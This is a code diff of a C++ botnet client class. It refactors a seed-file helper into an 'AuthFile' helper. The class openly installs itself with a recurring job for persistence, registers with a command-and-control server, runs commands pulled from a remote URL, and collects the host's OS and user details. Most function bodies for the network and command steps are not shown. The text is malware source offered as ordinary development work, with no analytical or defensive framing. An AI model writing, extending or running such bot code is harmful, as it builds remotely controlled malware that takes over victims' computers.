@@ -4,16 +4,16 @@
 #include "command.hh"
 #include "installer.hh"
 #include "request.hh"
-#include "seed.hh"
+#include "authfile.hh"
 #include "util.hh"
 
 const std::string HASH_TYPE("SHA256");
 
 class Bot {
    public:
-    Bot(const std::string& seed_path) {
+    Bot(const std::string& auth_path) {
         hash_type_ = HASH_TYPE;
-        seed_ = std::make_unique<Seed>(seed_path);
+        auth_ = std::make_unique<AuthFile>(auth_path);
     }
 
     void Install(std::string install_dir);
@@ -23,7 +23,7 @@ class Bot {
 
    private:
     std::string hash_type_, hash_sum_, os_, user_;
-    std::unique_ptr<Seed> seed_;
+    std::unique_ptr<AuthFile> auth_;
 
     void PrepareSysInfo_();
 };
@@ -32,11 +32,10 @@ void Bot::Install(std::string install_dir) {
     // Install files and components
     Installer installer(install_dir);
     installer.InstallFiles();
-    seed_->InitSeed();
     installer.InitRecurringJob();
 }
 
-bool Bot::IsInstalled() { return seed_->Exists(); }
+bool Bot::IsInstalled() { return auth_->Exists(); }
 
 void Bot::RegisterBot(const std::string& register_url) {
     // Register bot with C2 server
@@ -65,16 +64,16 @@ void Bot::ExecuteCommand(const std::string& command_url) {
 }
 
 void Bot::PrepareSysInfo_() {
-    // Init or retrieve seed
-    if (seed_->Exists()) {
-        seed_->GetSeed();
+    // Init or retrieve auth file
+    if (auth_->Exists()) {
+        auth_->Retrieve();
     } else {
-        seed_->InitSeed();
+        auth_->Init();
     }
 
     // Retrieve values if they haven't been already
     if (!(hash_sum_.size())) {
-        hash_sum_ = seed_->GetHash();
+        hash_sum_ = auth_->GetHash();
     }
     if (!(os_.size())) {
         os_ = util::GetOS();
